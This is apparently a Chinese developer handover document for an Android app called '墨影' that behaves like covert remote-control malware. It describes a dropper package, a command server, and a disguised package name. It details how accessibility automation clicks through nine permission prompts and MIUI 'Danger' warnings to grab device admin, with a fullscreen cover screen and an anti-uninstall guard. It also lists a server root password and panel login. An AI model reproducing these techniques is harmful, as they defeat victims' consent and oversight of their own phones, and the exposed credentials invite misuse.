# 交接文档：墨影 3.5 小米（MIUI）引导分支

> 更新时间：2026-10-31。当前工作树 `apk-project/versions/3.5-src`，手机上跑的是 **3.5 / v718**。
> 目标：做完“小米手机上的自动引导”这一条分支，且**不影响其他厂商**。

## 1. 项目结构（只看这几处）

```
apk-project/
├── versions/
│   ├── 3.4-src/          基线（= 服务器模板 3.4 / v614 的源码，已发布稳定版）
│   └── 3.5-src/          当前工作树（小米分支开发在这里）
├── installer-1.3.1/project/   A 包（安装器）smali 工程，当前 1.3.2 / versionCode 6
materials/
├── templates/templates.json   面板模板清单（apk-3.2 → 3.4/614；installer-1.3.2 → 1.3.2/6）
├── templates/v3.2.apk         B 包模板 APK（面板构建用，现为 v614）
server/                        refc2.py（aiohttp, 127.0.0.1:8794）+ 面板 web/panel
docs/deploy.md                 服务器部署（含 WebSocket 必开、zipalign 必装）
tools/new_version.sh           一键分叉：tools/new_version.sh 3.6 3.5
```

## 2. 构建（本地）

```bash
export JAVA_HOME=/Users/xxx/Downloads/01-墨影/apk-project/tools/jdk-17.0.20.1+1/Contents/Home
export PATH="$JAVA_HOME/bin:$PATH"

# 调试包（无“优化中”全屏、无防卸载守卫）
apk-project/tools/gradle-8.11.1/bin/gradle -p apk-project/versions/3.5-src \
  --offline assembleRelease -PversionCode=718 -PversionName=3.5 \
  -PnoGuide=true -PnoGuard=true \
  -x lintVitalAnalyzeRelease -x lintVitalReportRelease -x lintVitalRelease

# 正式包：去掉 -PnoGuide / -PnoGuard
```

产物：`apk-project/versions/3.5-src/app/build/outputs/apk/release/app-release.apk`
（习惯复制到 `artifacts/deploy-20261022/moying-3.5-vXXX-*.apk`）

## 3. 服务器与面板

```
域名      https://yk4.jk92.cc      面板 /panel/    账号 admin / mtx123
服务器    144.34.154.242           root / MrvErAUWctpW
站点目录  /www/wwwroot/yk4.jk92.cc （宝塔 Python 项目 yk4_jk92_cc 托管）
服务      venv/bin/python server/refc2.py --host 127.0.0.1 --port 8794
安全重启  bash server/restart.sh 8794
```

注意事项（踩过的坑，见 docs/deploy.md）：
- nginx 必须开 WebSocket（Upgrade/Connection），否则设备永远 400 不上线；
- 必须装 `zipalign`，否则 B 包 arsc 未对齐 → A 包装到 98% 报 `-124`；
- 运行数据已进仓库：`state/refc2.db`、`state/store.json`（换机不用重建配置）。

## 4. 当前在做什么（重点）

**做 MIUI 专属引导分支**，只改 MIUI，其他厂商流程一行不动。

### 分派点：`perm/OemFlow.kt`

```kotlin
enum Vendor { SAMSUNG, MIUI, COLOROS, ORIGINOS, EMUI, DEFAULT }
data class Plan(vendor, directPerm, riskGate, permDelayMs, steps)
```

- `vendor()` 按 MANUFACTURER/BRAND 判断（xiaomi/redmi/poco → MIUI）
- `plan()` 给每个厂商一份参数；MIUI：directPerm=true, riskGate=true, permDelayMs=25000
- 三星 / OPPO / vivo / 华为 走各自 Plan，行为保持原样

### MIUI 当前只有两步（v718）

```
第 1 步  无障碍连上 → startPermissionWithRetry(36) → 9 项运行时权限自动点「允许」
         PermissionActivity.finishWithDone() 在 MIUI 分支直接 finish()，不交棒
第 2 步  scheduleRestAfterGate() → miuiStepAdmin()
         点「激活」→ 危险页出现 → 等 2 秒 → 点「我已知晓」
         → 回读 isChecked → 打印日志后**停止（不点「确定」）** ← 当前就停在这
```

`AdminActivator` 的“激活成功→通知使用权→电池”自动续跑，已在 MIUI 分支 return 掉；
`DeviceAdminActivity.proceed()` 同样在 MIUI 分支直接 finish。

## 5. MIUI「危险」弹窗规律（实测，所有权限通用）

```
Activity: com.miui.securitycenter/.privacymanager.SpecialPermissionInterceptActivity
       或 com.miui.securitycenter/.privacymanager.DeviceManagerApplyActivity
TextView   id=intercept_warn_title         「危险」
RecyclerView id=intercept_warn_recycler    中间逐条说明（各权限不同，可忽略）
CheckBox   id=check_box                    未勾选；不勾则确定按钮 enabled=false
TextView   id=intercept_warn_content_end   「我已知晓…」，clickable（点它也能勾）
Button     id=intercept_warn_allow         「确定」，勾选后 enabled=true
Button     id=intercept_warn_deny          「取消」
```

**结论：靠 id/结构定位，不依赖语言**（多语言文案仅作兜底，`MiuiNavigator.RISK_ACK_TEXTS`）。

## 6. 已经验证过的事实（别再重复踩）

1. MIUI 拦“后台启动别的应用/系统设置页”（`MIUILOG- Permission Denied Activity`），
   但**自己应用内的 PermissionActivity 不受限**——权限申请不需要开「后台弹出界面」；
2. 「危险」弹窗对 **无障碍 / 通知使用权 / 设备管理员** 是同一个模板；
3. 无障碍本身开启时也会弹「危险」——这一刻我们的服务还没连上，**只能用户手动点**；
4. 连续点两下复选框会“勾上又取消”，必须“先读状态→只点一次→等 900ms 再回读”；
5. `adb shell dpm remove-active-admin` 对非 test admin 会被拒（SecurityException）；
   调试包在 `AgentApp.onCreate()`（`NO_GUARD=true`）里自撤 admin，之后才能卸载；
6. MIUI 常拦 `adb shell input tap`（INJECT_EVENTS）与 `settings put secure`；
   安装偶发 `INSTALL_FAILED_USER_RESTRICTED`，重试或 `pm install -r -d` 可过；
7. 通知使用权可用命令直接授：`adb shell cmd notification allow_listener <pkg>/<svc>`。

## 7. 下一步（建议顺序）

```
① 在危险页“只勾选”这一步跑稳（v718 待验证）
② 勾选成功后，恢复点「确定」：MiuiNavigator.passRiskDialog 加回 clickConfirm（含手势兜底）
③ 用 DPM 校验 isAdminActive 作为成功判据，不再用固定 20 秒盲等
④ 打通后再把「通知使用权」接回 MIUI 分支（注意详情页需点行→开关，且系统有 ~10 秒冷静期）
⑤ 最后接「电池计划」：自启动(AutoStartManagement) → 省电策略「无限制」(HiddenAppsConfig 第一项)
   → 电池白名单；用 oem_profiles.json 的 batteryPlan 顺序 + MiuiNavigator 点击
⑥ 全绿后出 3.5 正式包（带“优化中”全屏 + 引导完成后启动防卸载守卫），推服务器模板
```

## 8. 关键文件索引

| 文件 | 作用 |
|---|---|
| `perm/OemFlow.kt` | **厂商分派（唯一 case 分支入口）** |
| `perm/MiuiNavigator.kt` | 危险弹窗处理、按 id/结构点击、多语言兜底 |
| `perm/PermissionActivity.kt` | 9 项运行时权限申请；MIUI 分支 finish 不交棒 |
| `perm/PermissionClicker.kt` | 自动点「允许」（MIUI 间隔 ≥1200ms，见 DebugFlags） |
| `admin/AdminActivator.kt` | 点「激活」；MIUI 分支不续跑通知 |
| `admin/DeviceAdminActivity.kt` | 激活页载体；MIUI 分支 finish |
| `keepalive/BatteryPlan.kt` | 电池 4 步顺序执行器（已写，MIUI 分支暂未启用） |
| `keepalive/BatteryOptimization.kt` | 厂商私有电池页跳转（小米两页已验证可达） |
| `assets/oem_profiles.json` | 本地策略：小米电池计划、clickDelayMs=700、brand 别名 |
| `AgentApp.kt` | 调试包自撤设备管理员（否则 MIUI 不许卸载） |

## 9. 手机（当前测试机）

```
小米 Redmi 23108RN04Y / Android 13 / MIUI V14.0.7.0.TGPEUXM
已装：com.lite.cloudfinder v718（调试包）
状态：无障碍关闭、设备管理员未激活、日志已清
```

打开无障碍时：**第一层「危险（无障碍）」需手动点**，之后才轮到程序自动接管。

## 10. 三星对照机

```
SM-G981V / Android 13；走 Vendor.SAMSUNG 分支（directPerm=true, riskGate=false）
该分支代码未改动，行为应与 3.4 一致（未回归验证）
```
